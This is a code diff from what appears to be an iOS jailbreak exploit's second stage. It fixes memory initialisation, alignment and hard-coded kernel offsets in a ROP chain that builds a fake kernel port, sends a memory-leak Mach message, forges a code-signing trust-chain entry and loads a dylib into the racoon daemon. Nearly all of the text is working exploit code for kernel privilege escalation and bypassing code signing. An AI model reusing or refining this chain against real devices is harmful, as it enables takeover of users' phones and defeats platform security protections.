@@ -604,9 +604,7 @@ void build_databuffer(offset_struct_t * offsets, rop_var_t * ropvars) {
 	rop_var_t * current_var = ropvars;
 	while (current_var != NULL) {
 		uint64_t real_size = current_var->size;
-		if (current_var->size < 8) {// there is a problem where the rop framework can only work on 64 bit values FIXME 
-			current_var->size = 8;
-		} 
+		current_var->size += 8-(current_var->size % 8); // align
 		buffer_size += current_var->size;
 		if (buffer_size > offsets->stage2_databuffer_len) {
 			LOG("STAGE 3, DATABUFFER TO SMALL");
@@ -627,6 +625,7 @@ void stage2(offset_struct_t * offsets,char * base_dir) {
 	// TODO: the stage2_databuffer_len should be set in install.m
 	offsets->stage2_databuffer_len = 0x10000;
 	offsets->stage2_databuffer = malloc(offsets->stage2_databuffer_len);
+	memset(offsets->stage2_databuffer,0,offsets->stage2_databuffer_len);
 
 	// let's go
 	INIT_FRAMEWORK(offsets);
@@ -653,11 +652,12 @@ void stage2(offset_struct_t * offsets,char * base_dir) {
 	CALL_FUNC(get_addr_from_name(offsets,name),arg1,arg2,arg3,arg4,arg5,arg6,arg7,arg8);
 
 	char * buf[1024];
-	snprintf((char*)&buf,sizeof(buf),"testing...");
+	memset(buf,0,sizeof(buf));
+	snprintf(buf,sizeof(buf),"testing...");
 	DEFINE_ROP_VAR("test_string",sizeof(buf),buf);
 
-	char * tmp = malloc(0x1000);
-	memset(tmp,0,0x1000);
+	char * tmp = malloc(0x2000);
+	memset(tmp,0,0x2000);
 
 	// fixup errno (comment that out if you want to debug)
 	// map the memory it uses
@@ -893,8 +893,8 @@ void stage2(offset_struct_t * offsets,char * base_dir) {
 
 	SET_ROP_VAR64_TO_VAR_W_OFFSET("ool_msg",offsetof(ool_message_struct,desc[0].address),"tmp_port",0);
 
-
 	kport_t * fakeport = malloc(sizeof(kport_t));
+	memset(fakeport,0,sizeof(kport_t));
 	fakeport->ip_bits = IO_BITS_ACTIVE | IOT_PORT | IKOT_NONE;
 	fakeport->ip_references = 100;
 	fakeport->ip_lock.type = 0x11;
@@ -917,8 +917,8 @@ void stage2(offset_struct_t * offsets,char * base_dir) {
 		0x00000000,
 	};
 
-
 	MEMLEAK_Request * memleak_msg = malloc(sizeof(MEMLEAK_msg));
+	memset(memleak_msg,0,sizeof(MEMLEAK_msg));
 	memleak_msg->NDR = NDR_record;
 	memleak_msg->selector = 7;
 	memleak_msg->scalar_inputCnt = 0;
@@ -953,19 +953,22 @@ void stage2(offset_struct_t * offsets,char * base_dir) {
 		hash_t hash[2];
 	};
 	struct trust_chain * new_entry = malloc(sizeof(struct trust_chain));
+	memset(new_entry,0,sizeof(struct trust_chain));
 	snprintf((char*)&new_entry->uuid,16,"TURNDOWNFORWHAT?");
 	new_entry->count = 2;
-	hash_t my_dylib_hash = {0x1b,0x38,0xec,0x20,0x35,0xad,0x90,0xad,0x17,0x35,0xcb,0xbc,0xb0,0x88,0xa2,0xba,0x6a,0x10,0xbd,0x84};
-	hash_t my_binary_hash = {0xa8,0x90,0xd0,0x59,0xd7,0xc3,0xed,0x51,0x26,0x37,0xa1,0xf2,0xa2,0x42,0xf8,0x59,0x58,0xbe,0x60,0xd2};
+	hash_t my_dylib_hash = {0x1b,0x99,0xa5,0x2e,0x73,0x82,0x43,0x79,0x66,0x16,0x4a,0x39,0x65,0x96,0xcc,0x5e,0x71,0xac,0x74,0xe5};
+	hash_t my_binary_hash = {0xb9,0x5d,0x67,0x18,0x9a,0xa6,0x31,0x06,0x38,0xcf,0x3f,0x0d,0x54,0xc7,0x72,0x5f,0x4c,0x79,0x13,0x10};
 	memcpy(&new_entry->hash[0],my_dylib_hash,20);
 	memcpy(&new_entry->hash[1],my_binary_hash,20);
 	DEFINE_ROP_VAR("new_trust_chain_entry",sizeof(struct trust_chain),new_entry);
 
 	char * dylib_str = malloc(100);
+	memset(dylib_str,0,100);
 	snprintf(dylib_str,100,"/usr/sbin/racoon.dylib");
 	DEFINE_ROP_VAR("dylib_str",100,dylib_str);
 
 	char * wedidit_msg = malloc(1024);
+	memset(wedidit_msg,0,1024);
 	snprintf(wedidit_msg,1024,"WE DID IT\n");
 	DEFINE_ROP_VAR("WEDIDIT",1024,wedidit_msg);
 
@@ -1083,6 +1086,7 @@ void stage2(offset_struct_t * offsets,char * base_dir) {
 
 
 	char * cmp_str = malloc(100);
+	memset(cmp_str,0,100);
 	snprintf(cmp_str,100,"this boy needs some milk");
 	DEFINE_ROP_VAR("cmp_str",100,cmp_str);
 	DEFINE_ROP_VAR("strcmp_retval",8,tmp);
@@ -1512,7 +1516,7 @@ _STRUCT_ARM_THREAD_STATE64
 
 	// ghetto dlopen
 	// get a file descriptor for that dylib
-	DEFINE_ROP_VAR("dylib_fd",8,&buf);
+	DEFINE_ROP_VAR("dylib_fd",8,tmp);
 	ROP_VAR_ARG_HOW_MANY(1);
 	ROP_VAR_ARG("dylib_str",1);
 	CALL_FUNC_RET_SAVE_VAR("dylib_fd",get_addr_from_name(offsets,"open"),0,O_RDONLY,0,0,0,0,0,0);
@@ -1605,7 +1609,8 @@ _STRUCT_ARM_THREAD_STATE64
 		} userland_funcs;
 	} offsets_t;
 	offsets_t * lib_offsets = malloc(sizeof(offsets_t));
-	lib_offsets->constant.kernel_image_base = 0xffffff7000400000;
+	memset(lib_offsets,0,sizeof(offsets_t));
+	lib_offsets->constant.kernel_image_base = 0xfffffff007004000;
 	lib_offsets->funcs.copyin = 0xfffffff0071aa804;
 	lib_offsets->funcs.copyout = 0xfffffff0071aaa28;
 	lib_offsets->funcs.current_task = 0xfffffff0070f4d80;
@@ -1691,6 +1696,7 @@ _STRUCT_ARM_THREAD_STATE64
     ADD_GADGET(); /* D15 */
 	
 	char * racer_path = malloc(100);
+	memset(racer_path,0,100);
 	snprintf(racer_path,100,"/private/var/log/racoon.log");
 	DEFINE_ROP_VAR("racer_path",100,racer_path);
 
